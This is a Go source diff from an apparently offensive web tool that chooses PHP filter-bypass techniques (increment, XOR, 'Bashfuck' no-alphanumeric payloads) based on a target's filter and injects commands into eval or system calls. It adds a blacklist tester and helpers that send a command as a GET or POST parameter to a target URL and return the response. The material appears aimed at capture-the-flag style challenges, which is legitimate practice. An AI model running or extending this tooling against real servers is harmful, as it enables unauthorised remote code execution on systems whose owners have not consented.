@@ -1,6 +1,7 @@
 package script
 
 import (
+	"bytes"
 	"fmt"
 	"io"
 	"net/http"
@@ -65,7 +66,7 @@ func Test(URL string, Version string, command string, i string, m string) (strin
 // 分eval和system对过滤进行匹配
 func Damn(URL string, Version string, command string, i string, m string, cleanText string, guolv string, label *widget.Label) {
 
-	if strings.Contains(string(cleanText), "eval") || guolv != "" {
+	if strings.Contains(string(cleanText), "eval") && guolv != "" {
 		if strings.Contains(guolv, "a-z") && strings.Contains(guolv, "0-9") {
 			//eval环境下的无数字字母分好多种
 			if strings.Contains(guolv, "$") {
@@ -95,7 +96,7 @@ func Damn(URL string, Version string, command string, i string, m string, cleanT
 
 				} else if !strings.Contains(guolv, "$") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, ";") && !strings.Contains(guolv, ".") {
 					fmt.Println("可以使用自增")
-					Zizeng(URL, command, i, label)
+					Zizeng(URL, command, i, m, label)
 
 				} else if !strings.Contains(guolv, "^") && !strings.Contains(guolv, "$") && !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "'") && !strings.Contains(guolv, ".") && !strings.Contains(guolv, "_") && !strings.Contains(guolv, ";") {
 					fmt.Println("可以使用异或")
@@ -106,17 +107,20 @@ func Damn(URL string, Version string, command string, i string, m string, cleanT
 					Ff(URL, command, guolv, i, m, label)
 				}
 			}
+		} else {
+			Blacktest(guolv, m)
+
 		}
-	} else if strings.Contains(string(cleanText), "system") || guolv != "" {
+	} else if strings.Contains(string(cleanText), "system") && guolv != "" {
 
 		fmt.Println("执行system函数")
 		booL := "0"
-		Bashfuck(URL, command, guolv, i, m, label, booL) //无数字字母的system不分版本施工完毕
-		//啊不对，还差个环境变量
+		Bashfuck(URL, command, guolv, i, m, label, booL)
 
-		var char string
 		if booL == "0" {
-			Pwd(URL, char)
+			com, _ := Blacktest(guolv, "s")
+			huixian := Pwd(URL, i, m, com)
+			label.SetText(huixian)
 		}
 
 	} else {
@@ -247,4 +251,47 @@ func Damn(URL string, Version string, command string, i string, m string, cleanT
 
 	}
 
+}
+
+func GP(URL string, canshu string, m string, command string) string {
+	//这是一个根据参数节省重复写GET方式和POST方式的函数
+
+	if m == "GET" {
+
+		reURL := URL + "?" + canshu + "=" + command
+
+		response, _ := http.Get(reURL)
+		defer response.Body.Close()
+		doc, _ := io.ReadAll(response.Body)
+		result := RemoveHTMLTags(string(doc))
+
+		return result
+
+	} else if m == "POST" {
+
+		payload := []byte(canshu + "=" + command)
+
+		response, _ := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
+		defer response.Body.Close()
+		doc, _ := io.ReadAll(response.Body)
+		result := RemoveHTMLTags(string(doc))
+
+		return result
+
+	}
+	return "error"
+}
+
+func REQUEST(URL string, canshu string, get_ string, post_ string) string {
+
+	reURL := URL + "?" + canshu + "=" + get_
+	payload := []byte(canshu + "=" + post_)
+
+	response, _ := http.Post(reURL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
+	defer response.Body.Close()
+
+	doc, _ := io.ReadAll(response.Body)
+	result := RemoveHTMLTags(string(doc))
+
+	return result
 }
